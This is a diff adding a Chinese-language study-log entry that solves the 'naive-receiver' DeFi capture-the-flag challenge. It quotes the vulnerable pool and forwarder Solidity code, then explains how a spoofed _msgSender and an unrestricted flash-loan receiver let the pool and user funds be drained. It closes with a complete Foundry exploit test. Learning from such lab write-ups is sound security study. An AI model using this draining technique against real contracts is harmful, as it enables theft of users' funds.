@@ -339,6 +339,170 @@ function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amoun
 
 ### 2024.09.03
 
+#### native-receiver
+
+题目
+
+```
+There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 
+
+A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.
+
+All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.
+```
+
+要求将deployer的10weth和合约中的1000weth取出。
+
+看了合约之后，发现有一个函数可疑：
+
+```
+    function _msgSender() internal view override returns (address) {
+        if (msg.sender == trustedForwarder && msg.data.length >= 20) {//@audit 只有trustedForwarder调用且data长度大于20时，认为msg.sender为传入参数的最后20bytes
+            return address(bytes20(msg.data[msg.data.length - 20:]));
+        } else {
+            return super._msgSender();
+        }
+    }
+```
+
+也就是只要msg.sender为trustedForwarder，合约的_msgSender可以由msg.data指定为任意地址（指定部署合约的owner为扣款地址）。
+
+而存取款就用到了_msgSender():
+
+```
+    function withdraw(uint256 amount, address payable receiver) external {
+        deposits[_msgSender()] -= amount;
+        totalDeposits -= amount;
+        weth.transfer(receiver, amount);
+    }
+```
+
+因此可以实现给指定地址转账，并且扣款额度为msg.data。
+
+BasicForwarder合约中提供了execute方法进行call操作，就可以转出合约里的1000WETH。
+
+```
+function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
+        _checkRequest(request, signature);
+
+        nonces[request.from]++;
+
+        uint256 gasLeft;
+        uint256 value = request.value; // in wei
+        address target = request.target;
+        console.log("execute");
+        console.logBytes(request.data);
+        bytes memory payload = abi.encodePacked(request.data, request.from);//@audit 最后会+from，因此excute不能直接调用withdraw方法，否则最后msgsender会变成这个from，需要隔一层方法。
+        //pool合约中还提供了一个muticall方法，进行delegatecall，当本合约调用那个方法时，既可以通过msg.sender的验证，也可以隔一层方法，让此处的from不在成为withdraw的参数。
+         console.logBytes(payload);
+        uint256 forwardGas = request.gas;
+        assembly {
+            success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
+            gasLeft := gas()
+        }
+
+        if (gasLeft < request.gas / 63) {
+            assembly {
+                invalid()
+            }
+        }
+    }
+```
+
+
+
+除提取合约中存款以外，还有一点需要解决，即在receiver处还有10weth需要取出。
+
+```
+function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
+        external
+        returns (bool)
+    {
+        if (token != address(weth)) revert UnsupportedCurrency();
+
+        weth.transfer(address(receiver), amount);
+        totalDeposits -= amount;
+
+        if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
+            revert CallbackFailed();
+        }
+
+        uint256 amountWithFee = amount + FIXED_FEE;
+        weth.transferFrom(address(receiver), address(this), amountWithFee);
+        totalDeposits += amountWithFee;
+
+        deposits[feeReceiver] += FIXED_FEE;
+
+        return true;
+    }
+```
+
+观察发现：
+
+（1）借贷/偿还的receiver是任意指定的，因此可以传入任何地址作为借贷者，使其借贷并转走其weth作为手续费
+
+（2）手续费不是直接转到receiver地址的，而是转到pool合约中，记录到receiver名下。
+
+因此可以通过这种方式，将receiver的钱转移到deposits数组记录的金额下，再转走。
+
+看测试合约部署时，将deployer本身设为的receiver：
+
+```
+// Deploy pool and fund with ETH
+        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
+```
+
+因此可以先通过闪电贷将这10weth转到deposits中（此时1010weth都记录在deposits[deployer]下，再通过BasicForwarder.execute调用withdraw转走。
+
+POC：
+
+```
+   function test_naiveReceiver() public checkSolvedByPlayer {
+        // address deployer = makeAddr("deployer");
+        // address recovery = makeAddr("recovery");
+        // address player;
+        // uint256 playerPk;
+
+        // NaiveReceiverPool pool;
+        // WETH weth;
+        // FlashLoanReceiver receiver;
+        // BasicForwarder forwarder;
+
+        for(uint i=0; i<10; i++){
+            pool.flashLoan(receiver, address(weth), 0, "0x");
+        }
+        console.logUint(weth.balanceOf(address(pool))/1e18);
+        console.logUint(pool.deposits(address(deployer))/1e18);//确认1010weth确实到pool
+        bytes[] memory callDatas = new bytes[](1);
+        callDatas[0] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw, (1010e18, payable(recovery))),
+            abi.encode(deployer)
+        );
+        bytes memory callData;
+        callData = abi.encodeCall(pool.multicall, callDatas);
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            30000000,
+            forwarder.nonces(player),
+            callData,
+            1 days
+        );
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        require(forwarder.execute(request, signature)); 
+    }
+```
+
+
 
 ### 2024.09.04
 
